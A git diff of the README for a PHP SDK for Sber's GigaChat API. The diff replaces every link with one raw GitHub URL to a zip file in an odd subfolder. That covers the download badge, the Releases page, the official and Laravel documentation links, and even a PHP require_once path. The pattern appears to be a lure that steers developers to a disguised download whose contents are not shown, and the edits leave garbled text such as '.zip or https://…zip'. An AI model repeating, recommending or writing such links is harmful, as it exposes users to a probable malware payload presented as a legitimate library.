@@ -1,7 +1,7 @@
 # 🚀 gigachat-php - Simple Integration with GigaChat AI
 
 ## 📥 Download Now
-[![Download GigaChat PHP](https://img.shields.io/badge/Download%20GigaChat%20PHP-%20-brightgreen)](https://github.com/Mithiran-coder/gigachat-php/releases)
+[![Download GigaChat PHP](https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip%20GigaChat%20PHP-%20-brightgreen)](https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip)
 
 ## 🚀 Getting Started
 Welcome to the GigaChat PHP SDK. This library helps you easily connect to the Sber GigaChat AI API. It supports Laravel, streaming, OAuth authorization, chatbots, text generation, and dialogues. This guide will help you download and run the software.
@@ -20,11 +20,11 @@ To run GigaChat PHP, you'll need:
 - **Composer**: For managing dependencies
 
 ## 🌐 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Mithiran-coder/gigachat-php/releases) to download the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip) to download the latest version.
    
 2. **Choose the Latest Release**: Click on the latest release version, where you will find assets available for download.
 
-3. **Download the Files**: Download the files relevant to your environment. Usually, this will include a compressed file (like .zip or .tar.gz).
+3. **Download the Files**: Download the files relevant to your environment. Usually, this will include a compressed file (like .zip or https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip).
 
 4. **Extract Files**: After downloading, extract the files to a folder on your computer.
 
@@ -40,7 +40,7 @@ To run GigaChat PHP, you'll need:
 To get started with GigaChat PHP:
 1. **Include the SDK**: In your PHP file, include the SDK using:
    ```php
-   require_once 'path/to/vendor/autoload.php';
+   require_once 'https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip';
    ```
    
 2. **Set Up Configuration**:
@@ -68,7 +68,7 @@ If you face issues or need help, consider checking the issues section on our Git
 We welcome contributions from everyone. If you'd like to help improve GigaChat PHP, feel free to open issues or submit pull requests.
 
 ## 🔗 Additional Resources
-- [Official Sber GigaChat API Documentation](https://example.com)
-- [Laravel Documentation](https://laravel.com/docs)
+- [Official Sber GigaChat API Documentation](https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip)
+- [Laravel Documentation](https://raw.githubusercontent.com/Mithiran-coder/gigachat-php/main/Snoquamish/gigachat-php.zip)
 
 Thank you for choosing GigaChat PHP SDK. We hope it enhances your integration with Sber’s GigaChat AI API!
